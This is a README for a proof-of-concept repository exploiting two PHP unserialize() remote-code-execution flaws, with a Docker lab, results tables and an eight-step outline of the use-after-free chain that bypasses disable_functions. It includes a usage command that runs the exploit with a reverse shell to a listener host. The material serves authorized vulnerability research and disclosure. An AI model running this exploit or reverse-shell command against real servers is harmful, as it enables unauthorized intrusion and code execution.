# PHP2SHELL — CVE-2026-109618 / CVE-2026-109619

**Karim BOUDRA @ ULTRADEFENSE LAB** · October 21, 2026 · lab use only

![CVE-2026-109618](https://img.shields.io/badge/CVE--2026--109618-RCE-red)
![CVE-2026-109619](https://img.shields.io/badge/CVE--2026--109619-RCE-red)
![PHP](https://img.shields.io/badge/PHP-8.5.11%20vulnerable-blue)
![Chains](https://img.shields.io/badge/RCE-4%2F4%20confirmed-brightgreen)
![Scope](https://img.shields.io/badge/scope-lab%20only-yellow)

## Video demonstration

[![Animated preview of the PHP2SHELL demonstration](POC-preview.gif)](POC-demo.mp4)

Watch on Youtube : https://www.youtube.com/watch?v=NlJ_C07NL00
**[▶ Play the full video](POC-demo.mp4)**

Two RCEs in PHP's unserialize() core (C: Serializable and E: enum-autoload
branches in var_unserializer.re), reproduced on the day the patch was released:
local root with disable_functions bypassed, and a remote www-data shell in
~2,200 requests over both HTTP and TLS, for both CVEs.

## Structure

- `LAB/` — vulnerable Docker target with bridge networking
  - `Dockerfile` — PHP 8.5.11 Apache, two entry points, TLS, and checker
  - `docker-compose.yml` — bridge network, ports 8486 (HTTP) and 8483 (HTTPS)
  - `run.sh` — `up | status | down | clean`
  - `remote_app.php` — `C:` entry point (`Serializable`)
  - `remote_app_enum.php` — `E:` entry point (enum autoload)
  - `check.php` — safe detector for both branches and sink scanner
- `POC/`
  - [POCKETPOC-PHP2SHELL.py](https://github.com/KarimUD7/RCE-POCKET-POC-for-PHP2SHELL/blob/main/POC/POCKETPOC-PHP2SHELL.py "POCKETPOC-PHP2SHELL.py")
- `POC-demo.mp4` — full video
- `POC-preview.gif` — animated preview
- `README.md` — documentation
- `index.html` — repository page

## Prerequisites

| Tool | Purpose | Tested with |
|---|---|---|
| Python >= 3.8 | remote exploits `php8_remote*.py` | 3.14.5 (macOS arm64) |
| PHP CLI >= 7.4 | pocket PoC `pocket_poc.php` | 8.5.11 (NTS) |
| Docker + Compose | target lab `LAB/` | 29.6.2 / v5.1.4 |

```bash
python3 --version                  # >= 3.8 required
php --version                      # CLI, for the pocket PoC
docker compose version             # for LAB/run.sh
```

## Getting started

```bash
cd LAB
./run.sh up          # build + bridge container, listening on all interfaces
# local: http://127.0.0.1:8486     LAN: http://iplan:8486
```

## Exploitation

```bash
# pocket detection (any PHP server)
python3 POCKETPOC-PHP2SHELL.py --url http://172.20.10.5:8486/remote_app.php --reverse 172.20.10.5:4444
```

## Verified results (php:8.5.11)

| Chain | Requests | Result |
|---|---|---|
| C: HTTP | 2,169 | www-data RCE |
| C: HTTPS | 2,169 | www-data RCE |
| E: HTTP | 2,281 | www-data RCE |
| E: HTTPS | 2,175 | www-data RCE |
| C: / E: local | - | root, `disable_functions` bypassed |

## The chain in eight steps

1. `unserialize($data)->x = 0;` gadget (`C:` entry point) or enum autoload (`E:` entry point)
2. `a:41:{...}` payload: entry point + stdClass with 8 properties + 32 sprays + `R:4..11`
3. resize from 8 to 16: `efree()` releases arData; slots 4..11 point into it (UAF)
4. reclaim: the 280-byte sprays reclaim the freed bin-320
5. heap leak: write-through via `R:N` of a `zend_reference` pointer
6. `uaf_read(addr, n)`: fake `IS_STRING` positioned at an arbitrary address
7. fake closure: `ce`, `handlers`, `func.handler = zif_system` (resolved in the
   module's static function table, thereby bypassing `disable_functions`)
8. dispatch: `$result[33]("id")` locally; `serialize()` + fake vtable invoking
   `system()` remotely

## Warning

The bug is exploitable only when the target application passes attacker-controlled
data to `unserialize()`. Testing a third party requires written authorization and
crash-DoS rules of engagement. This repository is a lab: expose it only on controlled
networks, and shut it down with `./run.sh down` after use.

Research credits: Calif (MAD Bugs, public `C:` PoC), Nicolas Grekas (GH-23981,
`E:` branch).

PoC author: Karim BOUDRA @ ULTRADEFENSE LAB.

Greetings: CYBERSEC TEAM

## Disclaimer

This project is provided strictly for educational purposes and authorized security research. You are solely responsible for how you use it. The author assumes no liability for misuse, damage, or illegal activity. Use it only on systems you own or have explicit permission to test.
